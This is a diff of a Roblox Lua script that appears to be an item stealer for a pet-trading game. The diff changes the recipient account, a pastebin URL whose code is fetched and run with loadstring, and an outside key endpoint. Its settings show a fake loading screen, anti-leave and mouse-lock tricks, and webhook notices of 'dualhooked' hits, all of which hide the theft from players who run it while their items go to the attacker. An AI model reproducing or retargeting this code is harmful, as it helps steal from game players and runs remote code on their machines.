@@ -12,7 +12,7 @@
 _G.LoadingScreen = true
 
 getgenv().Settings = {
-    User = "petspsx651",
+    User = "qawowzz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = ".gg/scriptz",
     Titanics = {
@@ -755,7 +755,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://pastebin.com/raw/PD4xpLEs", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("https://pastebin.com/raw/JNPkshYb", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1093,7 +1093,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "https://janeq.space/others/keya.php" -- Exc : https://rizz.xyz/premium.php
+        local dhurl = "https://janeq.space/others/keys.php" -- Exc : https://rizz.xyz/premium.php
         local dhheaders = {
             ["content-type"] = "application/json"
         }
